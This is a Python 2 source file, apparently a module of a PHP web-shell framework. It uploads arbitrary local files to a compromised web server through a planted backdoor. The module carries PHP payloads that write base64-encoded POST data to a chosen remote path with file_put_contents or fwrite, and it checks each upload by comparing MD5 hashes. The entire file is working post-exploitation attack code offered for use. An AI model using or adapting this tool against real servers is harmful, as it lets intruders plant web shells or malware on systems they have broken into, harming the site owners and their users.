'''
Created on 23/set/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from core.http.cmdrequest import CmdRequest, NoDataException
from base64 import b64encode
from random import choice
from hashlib import md5

classname = 'Upload'
    
class Upload(Module):    
    '''Upload binary/ascii file to the target filesystem
    :file.upload <locale path> <remote path>
    '''
    
    
    vectors = VectorList([
        Vector('shell.php', 'file_put_contents', "file_put_contents('%s', base64_decode($_POST['%s']));"),
        Vector('shell.php', 'fwrite', '$h = fopen("%s", "w"); fwrite($h, base64_decode($_POST["%s"]));')
        ])
    
    def __init__(self, modhandler, url, password):
        Module.__init__(self, modhandler, url, password)    
        
        self.rand_post_name = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])
        
        
        
    def __execute_payload(self, vector, parameters):
        
#        file_exists = self.modhandler.load('file.check').run(remote_path, 'exists')
#        if file_exists:
#            raise ModuleException(self.name,  'File \'%s\' exists, change remote path' % remote_path)
#       
        local_path = parameters[0]
        remote_path = parameters[1]     
        
        try:
            local_file = open(local_path, 'r')
        except Exception, e:
            raise ModuleException(self.name,  "Open file '%s' failed" % (local_path))
        
        file_content = local_file.read()
        file_local_md5 = md5(file_content).hexdigest()
        file_encoded_content = b64encode(file_content)

        
        payload = vector.payloads[0] % (remote_path, self.rand_post_name)
        
        self.modhandler.load(vector.interpreter).run(payload, post_data = {self.rand_post_name : file_encoded_content})
        
            
        file_remote_md5 = self.modhandler.load('file.check').run(remote_path, 'md5')
        if file_remote_md5 == file_local_md5:
            self.mprint('[%s] File \'%s\' uploaded.' % (self.name, remote_path))
            return True
        else:
            file_exists = self.modhandler.load('file.check').run(remote_path, 'exists')
            if file_exists:
                self.mprint('[!] [%s] MD5 hash of \'%s\' file mismatch, file corrupted.' % (self.name, remote_path))
            else:
                self.mprint ('[!] [%s] File \'%s\' creation failed, check remote path and permissions.' % ( self.name, remote_path))
    

    def run( self, local_path, remote_path):
                
        vector = self._get_default_vector2()
        if vector:
            response = self.__execute_payload(vector, [local_path, remote_path])
            if response:
                self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                return 
        

        vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
        
        for vector in vectors:
            response = self.__execute_payload(vector, [local_path, remote_path])
            if response:
                self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                return

        
